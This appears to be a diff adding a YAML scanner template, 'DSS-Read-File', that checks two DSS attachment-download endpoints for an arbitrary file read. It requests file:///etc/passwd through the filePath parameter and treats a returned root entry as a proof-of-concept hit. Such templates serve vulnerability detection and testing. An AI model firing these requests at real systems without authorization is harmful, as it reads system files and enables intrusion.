@@ -1,0 +1,17 @@
+name: "DSS-Read-File"
+and: false
+rules:
+- method: GET
+  path: "/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+  follow_redirects: false
+  expression:
+    code: 200
+    body: "root:x:0:0:root:/root:/bin/bash"
+  output: "POC:DSS-Read-File-itc"
+- method: GET
+  path: "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+  follow_redirects: false
+  expression:
+    code: 200
+    body: "root:x:0:0:root:/root:/bin/bash"
+  output: "POC:DSS-Read-File-portal"
